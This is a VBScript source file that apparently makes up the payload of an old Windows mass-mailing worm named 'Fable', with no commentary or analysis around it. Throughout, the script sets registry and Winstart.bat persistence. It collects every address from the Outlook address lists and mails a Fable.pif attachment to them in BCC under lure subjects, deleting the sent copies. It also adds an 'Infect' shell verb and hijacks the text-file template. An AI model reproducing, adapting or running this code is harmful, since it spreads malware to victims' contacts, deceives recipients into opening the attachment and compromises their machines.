Windir1 = "C:\WINDOWS\"
Nogoto = True
Set R = CreateObject("WScript.Shell")
Set S = CreateObject("Scripting.FileSystemObject")
SF1 = Windir1 & "Blah.vbs"
If S.FileExists(SF1) Then
R.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\Changes", "C:\WINDOWS\wscript.exe " & SF1
End If
S.DeleteFile Windir1 & "Winstart.bat"
Set T = S.CreateTextFile(Windir1 & "Winstart.bat",True)
T.Writeline "@Ctty nul"
T.Writeline "copy " & Windir1 & "Tasks\Default.bat " & Windir1 & "MrBat.bat /y"
T.Writeline "C:\WINDOWS\COMMAND.COM /c " & Windir1 & "MrBat.bat"
T.Close
If S.FileExists(Windir1 & "Fable.pif") Then
VF = Windir1 & "Fable.pif"
ElseIf S.FileExists(Windir1 & "History\Fable.pif") Then
VF = Windir1 & "History\Fable.pif"
ElseIf S.FileExists("C:\Fable.pif") Then
VF = "C:\Fable.pif"
Else
Nogoto = False
End If
RKey=""
JKey=""
if S.FileExists(Windir1 & "EList.eml") then
Set JKey = CreateObject("Outlook.Application")
if JKey Is Not Nothing Then
Set KKey =JKey.GetNameSpace("MAPI")
Set FZ = S.OpenTextFile(Windir1 & "EList.eml",1)
Line = ""
Do While FZ.AtEndOfStream = False
Line1 = ""
Line1 = FZ.Readline
If Line1 = "" Then
Else
Line = Line & Line1 & ";"
End If
Loop
Line = Left(Line,Len(line) - 1)
FZ.Close
Set Whatever2 = JKey.CreateItem(0)
Whatever2.BCC = Line
randomize
value = int(rnd*3)
Select Case value
Case 0:
YY = "Fable"
Case 1:
YY = "Something You Should Read"
Case 2:
YY = "Very Important That You Receive This"
Case Else:
YY = "Very Important That You Receive This"
End Select
Whatever2.Subject = YY
if value = 1 Then
ZZ = "A nice little fable"
Else
ZZ = "Wanted to make sure you received this"
End If
With Whatever2
.Body = ZZ
.Attachments.Add VF
.DeleteAfterSubmit = True
.Send
End With
End if
S.DeleteFile Windir1 & "EList.eml"
End If
JKey = ""
RKey = R.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\El\Mission")
If RKey = "" And Nogoto Then
Set JKey = CreateObject("Outlook.Application")
If JKey Is Not Nothing Then
Set KKey = JKey.GetNameSpace("MAPI")
For Each Blah In KKey.AddressLists
dossucks1 = True
dossucks2 = ""
dossucks2 = Blah.AddressEntries.Count
If dossucks2 = 0 Or dossucks2 = "" Then
dossucks1 = False
End If
If dossucks1 Then
Set Whatever = JKey.CreateItem(0)
For R1 = 1 To Blah.AddressEntries.Count
Set R2 = Blah.AddressEntries(R1)
R3 = ""
R3 = R2.Address
If R3 = "" then
Else
RR4 = RR4 & R3 & ";"
End If
Next
RR4 = Left(RR4,Len(RR4) - 1)
Whatever.BCC = RR4
Randomize
value = int(rnd*3)
Select Case value
Case 0:
Y = "Fable"
Case 1:
Y = "Something You Should Read About"
Case 2:
Y = "Very Important That You Receive This"
Case Else:
Y = "Very Important That You Receive This"
End Select
Whatever.Subject = Y
if value = 1 Then
Z = "A little fable"
Else
Z = "Wanted to make sure you received this"
End If
With Whatever
.Body = Z
.Attachments.Add VF
.DeleteAfterSubmit = True
.Send
End With
X = 1
End If
Next
if X = 1 Then R.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\El\Mission", "PM"
End If
End If
Set T = S.CreateTextFile(Windir1 & "Safety.sys",True)
T.Writeline "Ok"
T.Close
RKey=""
RKey = R.RegRead("HKEY_CLASSES_ROOT\Fable\shell\Infect\command\")
If RKey = "" Then
R.RegWrite "HKEY_CLASSES_ROOT\.fab\Content Type", "text/plain"
R.RegWrite "HKEY_CLASSES_ROOT\.fab\", "Fable"
R.RegWrite "HKEY_CLASSES_ROOT\.fab\ShellNew\FileName", "Fable.fab"
R.RegWrite "HKEY_CLASSES_ROOT\.fab\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}\", "{EAB841A0-9550-11cf-8C16-00805F1408F3}"
R.RegWrite "HKEY_CLASSES_ROOT\Fable\", "Fable"
R.RegWrite "HKEY_CLASSES_ROOT\Fable\DefaultIcon\", Windir1 & "SYSTEM\shell32.dll,3"
R.RegWrite "HKEY_CLASSES_ROOT\Fable\shell\open\command\", Windir1 & "NOTEPAD.EXE " & chr(37) & "1"
R.RegWrite "HKEY_CLASSES_ROOT\Fable\shell\print\command\", Windir1 & "NOTEPAD.EXE /p " & chr(37) & "1"
R.RegWrite "HKEY_CLASSES_ROOT\Fable\shell\Infect\command\", Windir1 & "wscript.exe " & Windir1 & "finfo.vbs"
End If
S.DeleteFile Windir1 & "finfo.vbs"
S.DeleteFile Windir1 & "ShellNew\Text.txt"
Set T = S.CreateTextFile(Windir1 & "finfo.vbs",True)
T.Writeline "Msgbox " & chr(34) & "You're Infected With Fable" & chr(34) & chr(32) & chr(38) & " chr(13) " & chr(38) & " chr(13) " & chr(38) & chr(32) & chr(34) & "And while you are reading this, why would you select the Infect option from the menu? This could have damaged your computer" & chr(34)
T.Close
R.RegDelete "HKEY_CLASSES_ROOT\.txt\ShellNew\NullFile"
R.RegWrite "HKEY_CLASSES_ROOT\.txt\ShellNew\FileName", "Text.txt"
Set T = S.CreateTextFile(Windir1 & "ShellNew\Text.txt",True)
T.Writeline "Type Here"
T.Close
